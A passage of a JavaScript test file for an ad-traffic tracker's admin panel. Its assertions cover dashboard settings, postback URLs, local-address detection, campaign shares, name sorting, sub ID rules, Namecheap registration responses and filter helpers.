  const st = applyPageViews({ integrations: { added: ['namecheap', ' namecheap ', '', null, 'cloudflare'] } }, def);
  eq(st.intAdded, ['namecheap', 'cloudflare'], 'added ids deduped and cleaned');
  eq(collectPageViews(st).integrations, { added: ['namecheap', 'cloudflare'] }, 'collect added integrations');
  eq(applyPageViews(collectPageViews(st), def).intAdded, ['namecheap', 'cloudflare'], 'round trip added integrations');
  eq(collectPageViews(Object.assign({}, def, { intAdded: [] })).integrations, { added: [] }, 'a list emptied by the user is still sent');
  eq(applyPageViews({ integrations: { added: 'namecheap' } }, def).intAdded, undefined, 'added that is not a list is ignored');

  // The side list: configured (on, err, run) or added, in display order.
  const ids = ['keitaro', 'namecheap', 'cloudflare'];
  eq(integrationsShown(ids, undefined, { keitaro: 'on', namecheap: 'off', cloudflare: 'off' }), ['keitaro'], 'only the configured one');
  eq(integrationsShown(ids, ['cloudflare'], { keitaro: 'on', namecheap: 'off', cloudflare: 'off' }), ['keitaro', 'cloudflare'], 'added joins in display order');
  eq(integrationsShown(ids, [], { keitaro: 'run', namecheap: 'err', cloudflare: '' }), ['keitaro', 'namecheap'], 'import and error count as configured, unknown does not');
  eq(integrationsShown(ids, ['bogus'], {}), [], 'an unknown added id is not shown');
  eq(integrationsShown(['namecheap'], ['keitaro'], { keitaro: 'on' }), [], 'an integration the user may not open is never shown');

  // Which integration a route opens.
  eq(integrationTarget('namecheap', 'integrations', ids, ['keitaro']), 'namecheap', 'a deep link opens an integration outside the list');
  eq(integrationTarget('', 'keitaro', ids, []), 'keitaro', 'the old keitaro page opens Keitaro');
  eq(integrationTarget('bogus', 'integrations', ids, ['cloudflare', 'keitaro']), 'cloudflare', 'unknown id opens the first listed one');
  eq(integrationTarget('', 'integrations', ids, []), '', 'nothing listed means the empty page');
  eq(integrationTarget('keitaro', 'integrations', ['namecheap'], []), '', 'an integration the user may not open is not a target');
}
{
  const def = defaultPageViewState();
  eq(collectPageViews(def).dashboard.kpis, undefined, 'default body keeps no card set');
  eq(Object.keys(DASH_SETS), ['kpis', 'blocks', 'recent'], 'three dashboard sets');
  eq(DASH_SETS.kpis, ['visits', 'unique', 'conv', 'cost', 'revenue', 'profit', 'cr', 'roi', 'bots'], 'cards are the metrics the dashboard computes');
  eq(pageViewDashSet('kpis', [{ id: 'cost', on: true }, { id: 'uepc', on: true }, { id: 'zzz', on: true }, { id: 'cost', on: false }, { id: 'visits', on: false }]),
    [{ id: 'cost', on: true }, { id: 'visits', on: false }], 'a set drops unknown and repeated ids and keeps the order');
  eq(pageViewDashSet('kpis', [{ id: 'uepc', on: true }]), null, 'a set of unknown ids is no set');
  eq(pageViewDashSet('nope', [{ id: 'a', on: true }]), null, 'an unknown set is no set');
  eq(pageViewDashSet('blocks', 'chart'), null, 'a set that is not a list is no set');

  const hid = new Set(['cost', 'revenue', 'profit', 'roi']);
  eq(dashSetRows('kpis', [{ id: 'cr', on: false }, { id: 'cost', on: true }, { id: 'visits', on: true }], hid),
    [{ id: 'cr', on: false }, { id: 'visits', on: true }, { id: 'unique', on: true }, { id: 'conv', on: true }, { id: 'bots', on: true }],
    'saved order wins, hidden cards are not offered, new ids are appended on');
  eq(dashSetRows('blocks', undefined, new Set(['recent'])).map(r => r.id), ['chart', 'perf', 'offers', 'visitors'], 'without the logs section the recent block is not offered');
  eq(dashSetRows('blocks', [{ id: 'perf', on: false }, { id: 'chart', on: true }]).map(r => r.id + ':' + r.on),
    ['perf:false', 'chart:true', 'offers:false', 'visitors:true', 'recent:true'], 'a block switched off stays in the list, the offers block is off until switched on');
  eq(dashSetRows('blocks', undefined).map(r => r.id + ':' + r.on), ['chart:true', 'perf:true', 'offers:false', 'visitors:true', 'recent:true'], 'by default the offers block is off');
  eq(dashSetStored('blocks', dashSetRows('blocks', undefined)), null, 'the default blocks store nothing');
  const withOffers = dashSetRows('blocks', undefined); withOffers[2].on = true;
  eq(dashSetStored('blocks', withOffers).map(r => r.id + ':' + r.on), ['chart:true', 'perf:true', 'offers:true', 'visitors:true', 'recent:true'], 'the offers block switched on is stored');
  eq(dashSetRows('blocks', dashSetStored('blocks', withOffers))[2], { id: 'offers', on: true }, 'a stored offers block comes back on');
  eq(dashSetRows('blocks', [{ id: 'chart', on: true }, { id: 'perf', on: true }, { id: 'visitors', on: true }, { id: 'recent', on: true }]).find(r => r.id === 'offers').on, false, 'an account that never stored the block gets it off');
  eq(dashFoldOffers([
    { offer: '7', hits: 5, unique: 4, uniq_first: 3, conv: 1, profit: 10.5, group: 'a', stream: 's' },
    { offer: '7', hits: 3, unique: 2, conv: 0, profit: 0, group: 'b', stream: 't' },
    { offer: '2', hits: 9, unique: 6, conv: 2, profit: 4 },
    { offer: '', hits: 100, unique: 90, conv: 9, profit: 9 },
    { hits: 50 },
    { offer: '10', hits: 8, unique: 1, conv: 0, profit: 0 }]),
    [{ id: '2', hits: 9, unique: 6, conv: 2, profit: 4 }, { id: '7', hits: 8, unique: 6, conv: 1, profit: 10.5 }, { id: '10', hits: 8, unique: 1, conv: 0, profit: 0 }],
    'rows fold to the offer: sums, own uniques, no empty offer, most visits first, ties by id as numbers');
  eq(dashFoldOffers(null), [], 'no rows, no offers');
  eq(dashSetRows('recent', [{ id: 'ts', on: false }, { id: 'ip', on: false }], new Set(['os', 'browser', 'out', 'campaign'])).map(r => r.id + ':' + r.on),
    ['ts:true', 'ip:false'], 'the recent table keeps one column on');
  eq(dashSetRows('kpis', [{ id: 'visits', on: false }]).filter(r => r.on).length, 8, 'every card may be switched off');

  eq(dashSetStored('kpis', dashSetRows('kpis', undefined)), null, 'the default rows store nothing');
  eq(dashSetStored('kpis', dashSetRows('kpis', undefined, hid), hid), null, 'the default rows without hidden cards store nothing');
  const moved = dashSetRows('blocks', undefined); moved.reverse();
  eq(dashSetStored('blocks', moved).map(r => r.id), ['recent', 'visitors', 'offers', 'perf', 'chart'], 'a new order is stored');
  const off = dashSetRows('recent', undefined); off[2].on = false;
  eq(dashSetStored('recent', off).filter(r => !r.on).map(r => r.id), ['os'], 'a switched off column is stored');

  const st = applyPageViews({ dashboard: {
    kpis: [{ id: 'bots', on: false }, { id: 'uepc', on: true }, { id: 'visits', on: true }],
    blocks: [{ id: 'recent', on: true }, { id: 'chart', on: false }],
    recent: [{ id: 'ip', on: true }, { id: 'ts', on: true }],
  } }, def);
  eq(st.dashKpis, [{ id: 'bots', on: false }, { id: 'visits', on: true }], 'cards are read without unknown ids');
  eq(st.dashBlocks.map(r => r.id), ['recent', 'chart'], 'blocks are read in order');
  const put = collectPageViews(st);
  eq([put.dashboard.kpis, put.dashboard.blocks, put.dashboard.recent], [st.dashKpis, st.dashBlocks, st.dashRecent], 'the sets are collected as read');
  eq(applyPageViews(put, def).dashRecent, [{ id: 'ip', on: true }, { id: 'ts', on: true }], 'recent columns survive a round trip');
  eq(applyPageViews({ dashboard: { kpis: 'visits', blocks: [] } }, def).dashKpis, undefined, 'a bad set is ignored');
}
eq(postbackBase('admin.example.com','https:','https://admin.example.com','http://admin.example.com:8080'), 'https://admin.example.com', 'postback base drops the engine port');
eq(postbackBase('127.0.0.1','http:','http://127.0.0.1:8090','http://127.0.0.1:8080'), 'http://127.0.0.1:8080', 'postback base on localhost stays the engine');
['localhost','http://localhost:8080','app.localhost','127.0.0.1','127.8.9.10','https://127.0.0.1:8090/x','[::1]','http://[::1]:8080','::1','10.0.0.5','172.16.0.1','172.31.255.255','192.168.1.10','169.254.1.1','0.0.0.0','nas','box.local','svc.internal','host.lan','http://user@192.168.0.2:8080/path','100.64.0.1','fd00::1','fe80::1']
  .forEach(h => eq(isLocalHost(h), true, 'local address: ' + h));
['203.0.113.10','https://203.0.113.10','http://203.0.113.10:8080/p','8.8.8.8','172.15.0.1','172.32.0.1','192.169.1.1','11.0.0.1','100.63.0.1','admin.example.com','https://admin.example.com','localhost.example.com','2606:4700::1111','','   ',null,undefined]
  .forEach(h => eq(isLocalHost(h), false, 'public address or nothing: ' + h));
eq(postbackURL('https://admin.example.com/'), 'https://admin.example.com/postback?subid=REPLACE&status=REPLACE&payout=REPLACE', 'postback URL carries the three REPLACE placeholders');
eq(postbackHosts('https://a.example/', [{host:'b.example'},{host:'https://a.example/'},{host:'c.example',disabled:true},{host:''},null]), ['https://a.example','https://b.example'], 'postback hosts: main first, link domains unique, disabled and empty skipped');
eq(postbackHosts('', []), [], 'postback hosts: nothing known');
eq(postbackDefaultHost([{host:'links.example',role:'links'},{host:'Panel.Example.',role:'admin'},{host:'two.example',role:'both'}], '127.0.0.1', ['http://127.0.0.1:8080']), 'https://admin.panel.example', 'postback default: first admin-panel domain as admin.<host>');
eq(postbackDefaultHost([{host:'off.example',role:'admin',disabled:true},{host:'admin.x.example',role:'admin'},{host:'p.example',role:'links',primary:true}], '', []), 'https://admin.p.example', 'postback default: disabled and admin.* skipped, primary counts');
eq(postbackDefaultHost([{host:'l.example',role:'links'}], 'trk.example', ['https://trk.example','https://l.example']), 'https://trk.example', 'postback default: public page name');
eq(postbackDefaultHost([{host:'l.example',role:'links'}], '203.0.113.10', ['https://203.0.113.10','https://l.example']), 'https://l.example', 'postback default: bare IP page falls to the first link domain');
eq(postbackDefaultHost([], '203.0.113.10', ['https://203.0.113.10']), 'https://203.0.113.10', 'postback default: bare IP without link domains keeps the current host');
eq(postbackDefaultHost([], 'localhost', ['http://127.0.0.1:8080','https://l.example']), 'http://127.0.0.1:8080', 'postback default: localhost keeps the engine address');
eq(postbackDefaultHost(null, '', null), '', 'postback default: nothing known');
eq(postbackStatusURL('https://a.example/', 'rejected'), 'https://a.example/postback?subid={subid}&status=rejected', 'postback rejected: canonical status, no payout');
eq(postbackStatusURL('https://a.example', 'lead'), 'https://a.example/postback?subid={subid}&status=lead', 'postback lead: no payout');
eq(postbackStatusURL('https://a.example', 'Sale'), 'https://a.example/postback?subid={subid}&status=sale&payout={payout}', 'postback sale: payout macro');
eq(serviceBadge('disk', {status:{jobs:{disk:{last_run:'2020-01-02T00:00:00Z', running:true, ok:false, message:'old', next_run:'2020-01-03T00:00:00Z'}}}}).key, 'Running…', 'running before stale next_run');
eq(cronJobOutcome({last_run:'2020-01-02T00:00:00Z', running:true, ok:false, message:'old'}).badgeKey, 'Running…', 'outcome running badge');
eq(cronJobOutcome({last_run:'2020-01-02T00:00:00Z', running:true, ok:false, message:'old'}).resultKey, null, 'outcome running hides fail');
eq(cronJobOutcome({last_run:'2020-01-02T00:00:00Z', running:true, ok:false, message:'old'}).message, '', 'outcome running drops stale message');
eq(cronJobOutcome({last_run:'2020-01-02T00:00:00Z', ok:true, message:'ok'}).resultKey, null, 'outcome ok with message');
eq(cronJobOutcome({last_run:'2020-01-02T00:00:00Z', ok:true, message:'ok'}).badgeKey, 'done', 'outcome ok badge');
eq(cronJobOutcome({last_run:'2020-01-02T00:00:00Z', ok:false, error:'x'}).resultKey, 'failed', 'outcome fail');
eq(cronJobOutcome({last_run:'2020-01-02T00:00:00Z', ok:false, error:'x'}).dot, 'bad', 'outcome fail dot');
const runLine=(j)=>{const o=cronJobOutcome(j); return o.running?'Running…':(o.message?'msg':(o.resultKey||''));};
eq(runLine({last_run:'2020-01-02T00:00:00Z', running:true, ok:false}), 'Running…', 'status line running not failed');

eq(shareSum([60,'40',-5,'x',12.6]), 113, 'shares: rounded, a bad or negative value counts as 0');
eq(shareSum([]), 0, 'shares: empty list');
eq(shareSum(null), 0, 'shares: no list');
eq([sharesOver([60,40]), sharesOver([60,41]), sharesOver([100]), sharesOver([])], [false,true,false,false], 'shares: only a sum above 100 is over');
const ovGroups=(offers,landings)=>[{name:'A',streams:[{name:'s1',out:{offers:offers.map(share=>({share})),landings:landings.map(share=>({share}))}}]}];
eq(shareOverflow(ovGroups([60,50],[100])), {group:'A',stream:'s1',kind:'offer'}, 'shares: offers over 100');
eq(shareOverflow(ovGroups([100],[70,40])), {group:'A',stream:'s1',kind:'landing'}, 'shares: landings over 100');
eq(shareOverflow(ovGroups([60],[60])), null, 'shares: offers and landings are not added together');
eq(shareOverflow(ovGroups([-50,120],[])), {group:'A',stream:'s1',kind:'offer'}, 'shares: a negative share is 0, not a credit');
eq(shareOverflow([]), null, 'shares: no campaigns');
eq(shareOverflow([{id:'g9',streams:[{out:{}}]}]), null, 'shares: a stream without lists');

// Names: pictograph rank, then digits, latin, cyrillic inside the text key.
const nameMix=['❄️ Яр','Яблоко','✅ Beta','Zeta','❌ Alpha','Альфа','All Offers','10 Camp','2 Camp'];
const nameAsc=['2 Camp','10 Camp','All Offers','Zeta','Альфа','Яблоко','✅ Beta','❄️ Яр','❌ Alpha'];
eq(nameMix.slice().sort((a,b)=>compareNames(a,b,1)), nameAsc, 'names ascending');
eq(nameMix.slice().sort((a,b)=>compareNames(a,b,-1)), nameAsc.slice().reverse(), 'names descending reverses ascending');
eq(['Camp 10','Camp 2','camp 1'].sort((a,b)=>compareNames(a,b,1)), ['camp 1','Camp 2','Camp 10'], 'numbers inside a name are compared as numbers');
eq([compareNames('a','a',1), compareNames('A','a',1), compareNames('','x',1), compareNames(null,'x',1)], [0,-1,1,1], 'equal, case tie; an empty name sorts after real ones');
eq(compareNames('Plain','⚡️ 711',1)<0, true, 'plain sorts above lightning');
eq(compareNames('❌ last','✅ 1Win',1)>0&&compareNames('❌ last','❄ 1Win',1)>0&&compareNames('❌ last','Plain',1)>0&&compareNames('❌ last','⛓ 1Win',1)<0, true, 'cross sits after plain, check and snow, before chain');
eq(['✅ 1Win','❄ 1Win','⛓ 1Win'].sort((a,b)=>compareNames(a,b,1)), ['✅ 1Win','❄ 1Win','⛓ 1Win'], 'check, snow and chain groups stay ordered when the text matches');
eq(['🔥 a','⛓ a','🔍 a','❌ a','❄ a','✅ a','⚡ a','a'].sort((a,b)=>compareNames(a,b,1)), ['a','⚡ a','✅ a','❄ a','❌ a','🔍 a','🔥 a','⛓ a'], 'full pictograph order ascending');
const revSample=['⚡ z','Plain','✅ a','❌ x'];
eq(revSample.slice().sort((a,b)=>compareNames(a,b,-1)), revSample.slice().sort((a,b)=>compareNames(a,b,1)).reverse(), 'descending is the exact reverse of ascending');
eq(nameIconRank('⚡ 711'), nameIconRank('⚡️ 711'), 'lightning FE0F does not change rank');
eq(['⚡ 711','Plain','⚡️ 711'].sort((a,b)=>compareNames(a,b,1)), ['Plain','⚡ 711','⚡️ 711'], 'lightning with and without FE0F share one group after plain names');

// Signs that are text do not make an icon; emoji and symbols do.
eq(['© Camp','Camp®','Camp™','№5 Camp','«Camp»','"Camp"',"'Camp'",'(Camp)','#1 Camp','_Camp',''].map(nameHasIcon), [false,false,false,false,false,false,false,false,false,false,false], 'text signs are not icons');
eq(['✅ Beta','❌ Alpha','Camp 🔥','❄️ Яр'].map(nameHasIcon), [true,true,true,true], 'emoji are icons');
eq(['©️ Camp'].map(nameHasIcon), [false], 'a copyright sign alone is text');
const keyed=nameMix.map(n=>[n,nameKey(n)]);
eq(keyed.slice().sort((a,b)=>compareNameKeys(a[1],b[1],1)).map(p=>p[0]), nameAsc, 'sorting by ready keys gives the same order');
eq(nameKey('  ❌ Alpha ').icon+':'+nameKey('Яблоко').script+':'+nameKey('  Zeta ').raw, '4:2:Zeta', 'a name key holds icon rank, script and the trimmed text');

// A saved column list that already has the model column is never swapped again.
const colsC=[{id:'a',on:1},{id:'device_model',on:0},{id:'brand',on:1}];
eq([adoptModelCol(colsC,false), colsC.map(c=>c.id+':'+c.on)], [false,['a:1','device_model:0','brand:1']], 'a saved list with the model column stays as it is');
const colsD=[{id:'brand',on:1},{id:'device_model',on:0}];
eq([adoptModelCol(colsD,true), colsD.map(c=>c.id+':'+c.on)], [true,['device_model:1','brand:false']], 'a list without the model column gets it once');
eq([shareInt('x'),shareInt(-3),shareInt(12.6),shareInt('40'),shareInt(null)], [0,0,13,40,0], 'a share is a whole non-negative percent');
eq(shareSum(['-5','7.4']), 7, 'sum counts what the server stores');

// Server texts with a number or a field in them.
eq(errInfo('sub id rule sub_id_3: value is too long'), {key:'err.sid.long',vars:{n:'3'}}, 'sub id too long');
eq(errInfo('sub id rule sub_id_12: flag must be 1 or 2'), {key:'err.sid.flag',vars:{n:'12'}}, 'sub id flag');
eq(errInfo('unknown sub id rule sub_id_99'), {key:'err.sid.unknown',vars:{rule:'sub_id_99'}}, 'unknown sub id rule');
eq(errInfo('contacts: phone required', true), {key:'nc.err.creq',vars:{field:'phone'}}, 'a required contact field');
eq(errInfo('contacts: phone required', false), null, 'contact texts belong to the registrar screens');
eq([errInfo('not pending', true).key, errInfo('not pending', false), errInfo('shares exceed 100', false).key, errInfo('shares exceed 100', true).key], ['nc.err.notpending',null,'err.shares','err.shares'], 'registrar texts stay out of the general list');
eq(errInfo('no such text'), null, 'unknown text');
const sidGroups=v=>[{name:'A',streams:[{name:'s1',rules:{sub_ids:{sub_id_2:{values:[v]}}}}]}];
eq(subIDOverflow(sidGroups('a'.repeat(255))), null, 'sub id of 255 bytes fits');
eq(subIDOverflow(sidGroups('я'.repeat(128))), {group:'A',stream:'s1',n:2}, 'sub id counts bytes, not letters');
eq(subIDOverflow([]), null, 'no campaigns');

// Rules the editor does not own survive a save.
const keptRules={country:{flag:1,values:['ru']}, model:{flag:2,values:['SM-S918B']}, sub_ids:{sub_id_1:{flag:2,values:['a']}}, future:{deep:[1,{x:2}]}};
const extras=ruleExtras(keptRules, new Set(['country','model']));
eq(Object.keys(extras).sort(), ['future','sub_ids'], 'ruleExtras keeps unknown keys only');
extras.future.deep[1].x=9;
eq(keptRules.future.deep[1].x, 2, 'ruleExtras copies deeply');
eq(ruleExtras(null, new Set()), {}, 'ruleExtras without rules');
eq(ruleExtras({a:undefined,b:0}, new Set()), {b:0}, 'ruleExtras skips undefined, keeps zero');

// Sub ID rules.
eq([condKeyOf('sub_id_3'), condKeyOf('sub_id_12'), condKeyOf('country'), condKeyOf('sub_id_x'), condKeyOf('')], ['sub_ids','sub_ids','country','sub_id_x',''], 'reason keys map to the Sub ID row');
eq(subIDRows({sub_ids:{sub_id_3:{flag:1,values:['a']}, sub_id_1:{flag:2,values:['x'],empty:true}, sub_id_30:{flag:1,values:['z']}, sub_id_31:{flag:1,values:['no']}}}),
  [{n:1,flag:2,values:['x'],empty:true,contains:false},{n:3,flag:1,values:['a'],empty:false,contains:false},{n:30,flag:1,values:['z'],empty:false,contains:false}], 'subIDRows: ordered, 1..30 only');
eq(subIDRows({}), [], 'subIDRows: none');
eq(subIDRows({sub_ids:{sub_id_2:{flag:7}}}), [{n:2,flag:2,values:[],empty:false,contains:false}], 'subIDRows: a flag that is not 1 reads as only');
eq(subIDRows({sub_ids:{sub_id_4:{flag:1,values:['ab'],contains:true}}}), [{n:4,flag:1,values:['ab'],empty:false,contains:true}], 'subIDRows: contains stays true');
eq(subIDMap([{n:2,flag:1,values:[' a ','',' b'],empty:false},{n:2,flag:2,values:['z'],empty:true},{n:0,flag:1,values:['q']},{n:31,flag:1,values:['q']},{n:30,flag:1,values:['q']}]),
  {sub_id_2:{flag:2,values:['z'],empty:true}, sub_id_30:{flag:1,values:['q']}}, 'subIDMap: last row of a number wins, out-of-range dropped');
eq(deviceFlags(true, []), {computer:0,phone:0,tablet:0}, 'device: empty pick filters nothing');
eq(deviceFlags(true, ['phone']), {computer:1,phone:0,tablet:1}, 'device: yes keeps the picked type');
eq(deviceFlags(false, ['phone','tablet']), {computer:0,phone:1,tablet:1}, 'device: no blocks the picked types');
eq(deviceMode({}), {yes:true, picked:[]}, 'device: no blocks reads as yes and empty');
eq(deviceMode({computer:1,phone:0,tablet:0}), {yes:false, picked:['computer']}, 'device: one block reads as no');
eq(deviceMode({computer:1,phone:1,tablet:0}), {yes:true, picked:['tablet']}, 'device: more blocks than allows reads as yes');
eq(subIDMap([{n:4,flag:1,values:['q'],empty:false}]), {sub_id_4:{flag:1,values:['q']}}, 'subIDMap: empty is written only when true');
eq(subIDMap([{n:4,flag:1,values:['ab'],contains:true},{n:5,flag:2,values:['z'],contains:false}]), {sub_id_4:{flag:1,values:['ab'],contains:true},sub_id_5:{flag:2,values:['z']}}, 'subIDMap: contains is written only when true');
eq(subIDMap(null), {}, 'subIDMap: no rows');
eq([subIDActive({values:['a'],empty:false}), subIDActive({values:[],empty:true}), subIDActive({values:[],empty:false}), subIDActive(null)], [true,true,false,false], 'subIDActive');

// The device model column takes the place of the brand column.
const colsA=[{id:'a',on:1},{id:'device_model',on:1},{id:'brand',on:1}];
eq([modelColSwap(colsA), colsA.map(c=>c.id+':'+c.on)], [true,['a:1','device_model:1','brand:false']], 'model shows when brand was shown');
const colsB=[{id:'device_model',on:1},{id:'a',on:1},{id:'brand',on:0}];
eq([modelColSwap(colsB), colsB.map(c=>c.id+':'+c.on)], [true,['a:1','device_model:0','brand:false']], 'model hidden when brand was hidden');
eq(modelColSwap([{id:'brand',on:1}]), false, 'no model column, nothing to swap');
eq(modelColSwap([{id:'device_model',on:1}]), false, 'no brand column, nothing to swap');

// Server error texts.
eq([errKey('shares exceed 100'), errKey(' api_key required for new host '), errKey('toString'), errKey(''), errKey(null), errKey('something else')], ['err.shares','kt.err.keyhost','','','',''], 'errKey');

// Namecheap answers.
eq(ncOutcome(409,{error:'price changed',price:12.5}), {kind:'price',price:12.5}, 'nc: price changed');
eq(ncOutcome(409,{error:'too early',retry_after:540.4}), {kind:'early',wait:540}, 'nc: too early');
eq(ncOutcome(409,{error:'too early'}), {kind:'early',wait:0}, 'nc: too early without a wait');
eq(ncOutcome(409,{error:'not registered',pending:false}), {kind:'released'}, 'nc: released');
eq(ncOutcome(409,{error:'registered at namecheap',confirmed:true}), {kind:'owned'}, 'nc: owned');
eq(ncOutcome(409,{error:'pending'}), {kind:'pending'}, 'nc: pending 409');
eq(ncOutcome(502,{error:'x',pending:true}), {kind:'pending'}, 'nc: pending 502');
eq(ncOutcome(500,{error:'registered but not saved',pending:true}), {kind:'pending'}, 'nc: registered but not saved');
eq(ncOutcome(502,{error:'timeout'}), {kind:'error'}, 'nc: plain 502 is an error');
eq(ncOutcome(422,{error:'premium domain not allowed'}), {kind:'premium'}, 'nc: premium');
eq(ncOutcome(503,{error:'namecheap not configured'}), {kind:'config'}, 'nc: not configured');
eq(ncOutcome(400,null), {kind:'error'}, 'nc: no body');
eq([ncTotal(10.98,3), ncTotal(9.99,1), ncTotal('8.5','2'), ncTotal(0,2), ncTotal(5,0), ncTotal(-1,1), ncTotal('x',1)], [32.94,9.99,17,0,0,0,0], 'nc: term price');
eq(nsLines('NS1.Example.com.\nns2.example.com, ns1.example.com;  ns3.example.com'), ['ns1.example.com','ns2.example.com','ns3.example.com'], 'nameservers: lowered, dot cut, repeats dropped');
eq([nsLines(''), nsLines(null)], [[],[]], 'nameservers: nothing typed');
eq([nsProblem([],true), nsProblem([],false), nsProblem(['a.com'],true), nsProblem(['a.com','b.com'],false), nsProblem(Array.from({length:12},(_,i)=>'n'+i+'.com'),false), nsProblem(Array.from({length:13},(_,i)=>'n'+i+'.com'),true)],
  ['','nc.ns.few','nc.ns.few','','','nc.ns.many'], 'nameservers: 2 to 12, or none when optional');
eq(thenMode({redirect:'group', offers:[{id:'a'}]}), 'action', 'group stays an action');
eq(thenMode({redirect:'landing'}), 'offers', 'landing is the offers mode');
eq(thenMode({redirect:'http_redirect'}), 'url', 'bare redirect is a url');
eq(thenMode({redirect:'http_redirect', offers:[]}), 'url', 'empty offers stay a url');
eq(thenMode({redirect:'http_redirect', offers:[{id:'a'}]}), 'offers', 'redirect with offers is offers');
const left={redirect:'http_redirect', out:'https://x', out_shares:[50], offers:[]};
switchThenMode(left, 'offers');
eq(left.out, '', 'leaving a url clears it');
const moved={redirect:'http_redirect', offers:[{id:'a',share:100}], landings:[{id:'b'}], out:'z'};
switchThenMode(moved, 'action');
eq(moved.redirect, 'group', 'offers become the group action');
eq(moved.offers, [], 'action drops offers');

const simA={id:'A',redirect:'group',out:'B'};
const simB={id:'B',redirect:'group',out:'C'};
const simC={id:'C',redirect:'group',out:'A'};
const simZ={id:'Z'};
const simCyc=simGroups([simA,simB,simC,simZ],'A');
eq(simCyc.map(g=>g.id).sort(), ['A','B','C'], 'simGroups cycle is A B C');
eq(simCyc.length<=3, true, 'simGroups cycle stays within three');
eq(simGroups([{id:'solo'},simZ],'solo').map(g=>g.id), ['solo'], 'simGroups campaign without links');
eq(simGroups([simA],'missing'), [], 'simGroups unknown id');
eq(simGroups([{id:'A',redirect:'group',out:'promo'},{id:'B',aliases:['promo']}],'A').map(g=>g.id), ['A','B'], 'simGroups finds the alias');
const simChain=['c0','c1','c2','c3','c4','c5'].map((id,i,a)=>({id,redirect:'group',out:a[i+1]||''}));
eq(simGroups(simChain,'c0').map(g=>g.id), ['c0','c1','c2','c3'], 'simGroups depth is four from the root');

eq(ipEntries('1.2.3.4\n5.6.7.8'), ['1.2.3.4','5.6.7.8'], 'two lines');
eq(ipEntries('1.2.3.4 5.6.7.8 10.0.0.1'), ['1.2.3.4','5.6.7.8','10.0.0.1'], 'spaces of the old field');
eq(ipEntries('1.2.3.4\n1.2.3.4\n1.2.3.4'), ['1.2.3.4'], 'repeat dropped, first stays');
eq(ipEntries('AbC\nabc'), ['AbC'], 'repeat ignores letter case');
eq(ipEntries('1.2.3.4-1.2.3.9'), ['1.2.3.4-1.2.3.9'], 'a range is one entry');
eq(ipEntries('10.0.0.0/8'), ['10.0.0.0/8'], 'a prefix is one entry');
eq(ipEntries('1.2.3.4\n\n  \n5.6.7.8\n'), ['1.2.3.4','5.6.7.8'], 'empty lines dropped');

eq(titleText(false, 'EmpatASO', 'Кампании'), '', 'unknown brand');
eq(titleText(true, 'EmpatASO', 'Кампании'), 'EmpatASO - Кампании', 'name and page');
eq(titleText(true, 'EmpatASO', ''), 'EmpatASO', 'name only');
eq(titleText(true, '', 'Кампании'), 'Кампании', 'empty company name keeps page');
eq(titleText(true, '', ''), '', 'known brand without name or page');

eq(fltFieldFree('cid'), true, 'cid is free text');
eq(fltFieldFree('site'), true, 'site is free text');
eq(fltFieldFree('sub_id_5'), true, 'sub id is free text');
eq(fltFieldStrict('campaign'), true, 'campaign is strict');
eq(fltFieldStrict('city'), false, 'city is not strict');
eq(fltFieldKind('device'), 'suggest', 'device is suggest');
eq(fltFieldSuggest('country', false), true, 'strict country always suggests');
eq(fltFieldSuggest('city', true), true, 'suggest dimension with dim');
eq(fltFieldSuggest('cid', true), false, 'free text ignores dim');
eq(dockTotal(null, 3), 3, 'dockTotal fallback');
eq(dockTotal({count:5}, 0), 5, 'dockTotal count');
eq(dockTotal(null, 0), 0, 'dockTotal null safe');
const merged=fltMergeOptions([{key:'a',label:'A'}],[{key:'b',label:'B'},{key:'a',label:'dup'}]);
eq(merged.map(x=>x.key), ['a','b'], 'fltMergeOptions dedupe');
const cat=fltCatalogItems('offer_id',{offers:[{id:'o1',name:'One',group:'G'}]});
eq(cat[0].key, 'o1', 'catalog offer id');
eq(fltSanitizeValues('campaign',['x','o1'],new Set(['o1'])), ['o1'], 'sanitize strict');
eq(fltSanitizeValues('keyword',['a','b'],new Set()), ['a','b'], 'sanitize free keeps all');
const cr=groupCreateOption('New', ['Old'], q=>'Create '+q);
eq(cr&&cr.key, 'New', 'group create option');
eq(fltCommit({op:'eq',v:[]}, 'Foo, Bar'), true, 'eq keeps comma text');
{const row={op:'eq',v:[]}; fltCommit(row,'Foo, Bar'); eq(row.v, ['Foo, Bar'], 'eq whole string');}
eq(fltOptionLabel('offer_id', 'o1', 'Offer A'), 'Offer A · o1', 'option label with name');
eq(fltOptionLabel('campaign', '🔥 Test', '🔥 Test'), '🔥 Test', 'emoji campaign name');
eq(fltFilterOptions([{key:'aa',label:'Alpha'},{key:'bb',label:'Beta'}], 'be', 50).items, [{key:'bb',label:'Beta',group:''}], 'filter by label');
eq(fltFilterOptions(Array.from({length:60}, (_,i)=>({key:'k'+i,label:'item'+i})), 'item', 50).truncated, true, 'filter limit');
eq(fltStatusLabelKey('sale'), 'conv.sale', 'status label key');
eq(fltOpMulti('in'), true, 'in is multi');
eq(fltOpMulti('eq'), false, 'eq is single');
{const row={op:'in',v:['a']}; eq(fltPickValue(row,'b',true), true, 'pick multi'); eq(row.v, ['a','b'], 'pick multi values');}
{const row={op:'eq',v:[]}; eq(fltPickValue(row,'x',false), true, 'pick single'); eq(row.v, ['x'], 'pick single value');}
eq(fltExcludeSelected([{key:'a'},{key:'b'}], ['a']).map(x=>x.key), ['b'], 'exclude selected');
const gr=fltOptionGroups([{key:'1',label:'A',group:''},{key:'2',label:'B',group:'G1'}], true);
eq(gr.length, 2, 'option groups split');
eq(gr[0].label, '', 'ungrouped first');

function condSplitListQA(s){
  const x=String(s||''); if(!x) return []; const out=[]; let b='';
  for(let i=0;i<x.length;i++){
    if(x[i]==='\\'){ if(i+1<x.length){ if(x[i+1]==='\\'){ b+='\\'; i++; continue; } if(x[i+1]===','){ b+=','; i++; continue; } } b+='\\'; continue; }
    if(x[i]===','){ out.push(b); b=''; continue; }
    b+=x[i];
  }
  out.push(b); return out;
}
function expandCondValuesQA(op, raw){
  const out=[]; (raw||[]).forEach(v=>{ if(op==='in'||op==='nin') condSplitListQA(v).forEach(p=>out.push(p)); else out.push(String(v)); });
  return out;
}
function parseCondsFromQS(qs){
  const grouped={}, order=[];
  qs.getAll('f').forEach(v=>{
    const i=v.indexOf(':'), j=v.indexOf(':', i+1); if(i<0||j<0) return;
    const field=v.slice(0,i), op=v.slice(i+1,j), val=v.slice(j+1);
    const k=field+'\0'+op; if(!grouped[k]){ grouped[k]=[]; order.push(k); } grouped[k].push(val);
  });
  return order.map(k=>{ const p=k.split('\0'); let vals=expandCondValuesQA(p[1], grouped[k]); let op=p[1];
